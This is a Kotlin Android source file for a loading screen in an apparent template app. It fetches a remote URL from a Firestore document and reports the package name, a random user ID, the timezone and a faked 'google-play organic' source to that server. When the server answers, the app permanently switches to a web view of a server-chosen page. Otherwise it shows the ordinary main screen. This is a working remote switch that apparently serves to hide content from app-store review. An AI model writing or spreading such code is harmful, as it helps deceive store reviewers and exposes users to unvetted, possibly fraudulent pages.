package com.template

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.DelicateCoroutinesApi
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.IOException
import java.util.Locale
import java.util.TimeZone
import java.util.UUID
import kotlin.math.abs


class LoadingActivity : AppCompatActivity() {

    companion object {
        private const val SHARED_PREFS_NAME = "sharedPref"
        private const val KEY_URL = "finalUrl"
        private const val KEY_FIRESTORE_URL_NULL = "isFirestoreUrlNullOrEmpty"
        private const val KEY_FINAL_URL_EXIST = "isFinalUrlExist"
        private const val Collection_ID = "database"
        private const val Document_ID = "check"
        private const val Field = "link"
    }

    private lateinit var sharedPreferences: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        FirebaseAnalytics.getInstance(this)
        FirebaseMessaging.getInstance().isAutoInitEnabled = true
        sharedPreferences = getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE)

        if (!isConnectedToInternet(this) || wasFirestoreUrlNullOrEmpty()) {
            println("null/empty url ")
            openMainActivity()
        }
        else if (isFinalUrlExist()){
            println("url exist")
            openWebActivity()
        } else {
            println("fetching final url")
            fetchFinalUrl()
        }
    }


    private fun fetchFinalUrl() {
        val db = Firebase.firestore
        db.collection(Collection_ID).document(Document_ID).get().addOnSuccessListener { document ->
            if (document != null) {
                handleFirebaseData(document.get(Field).toString())
            } else {
                caseEmptyFirebase()
            }
        }
            .addOnFailureListener {
                caseEmptyFirebase()
            }
    }

    private fun handleFirebaseData(domain: String) {
        if (domain.isEmpty())
            caseEmptyFirebase()
        else{
            val packageName = packageName
            val userId = UUID.randomUUID().toString()
            val timeZone = getTimeZone()
            val getr = "utm_source=google-play&utm_medium=organic"
            val url =
                "$domain/?packageid=$packageName&usserid=$userId&getz=$timeZone&getr=$getr"
            sendHttpRequest(url)
        }
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun sendHttpRequest(urlString: String) {
        GlobalScope.launch(Dispatchers.IO) {
            val client = OkHttpClient()

            val request = Request.Builder()
                .url(urlString)
                .header("User-Agent", System.getProperty("http.agent") as String)
                .build()
            println("request: $request")
            try {
                val response: Response = client.newCall(request).execute()
                println("response: $response")
                if (response.isSuccessful) {
                    val responseData = response.body?.string()
                    if (responseData != null) {
                        caseUrlFound(responseData)
                    } else {
                        caseEmptyFirebase()
                    }
                } else {
                    caseEmptyFirebase()
                }
            } catch (e: IOException) {
                e.printStackTrace()
                caseEmptyFirebase()
            }
        }
    }

    private fun getTimeZone(): String {
        val timeZone = TimeZone.getDefault()
        val timeZoneId = when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O -> timeZone.toZoneId().id
            else -> {
                val timeZoneOffset = timeZone.rawOffset
                val timeZoneOffsetHours = timeZoneOffset / (1000 * 60 * 60)
                val timeZoneOffsetMinutes = abs((timeZoneOffset % (1000 * 60 * 60)) / (1000 * 60))
                String.format(Locale.US, "GMT%+02d:%02d", timeZoneOffsetHours, timeZoneOffsetMinutes)
            }
        }
        return timeZoneId
    }

    private fun caseUrlFound(url: String){
        setFinalUrl(url)
        sharedPreferences.edit().putBoolean(KEY_FINAL_URL_EXIST, true).apply()
        openWebActivity()
    }

    private fun caseEmptyFirebase(){
        println("case empty firebase")
        sharedPreferences.edit().putBoolean(KEY_FIRESTORE_URL_NULL, true).apply()
        openMainActivity()
    }

    private fun setFinalUrl(url: String){
        sharedPreferences.edit().putString(KEY_URL,url).apply()
    }

    private fun getFinalUrl(): String? {
        return sharedPreferences.getString(KEY_URL,null)
    }

    private fun wasFirestoreUrlNullOrEmpty(): Boolean {
        return sharedPreferences.getBoolean(KEY_FIRESTORE_URL_NULL, false)
    }

    private fun isFinalUrlExist(): Boolean {
        return sharedPreferences.getBoolean(KEY_FINAL_URL_EXIST, false)
    }

    private fun isConnectedToInternet(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork ?: return false
            val activeNetwork = cm.getNetworkCapabilities(network) ?: return false
            return when {
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                else -> false
            }
        } else {
            @Suppress("DEPRECATION") val networkInfo =
                cm.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }

    private fun openMainActivity() {
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }

    private fun openWebActivity() {
        val url = getFinalUrl()
        val intent = Intent(this, WebActivity::class.java)
        intent.putExtra(WebActivity.EXTRA_URL, url)
        startActivity(intent)
        finish()
    }
}
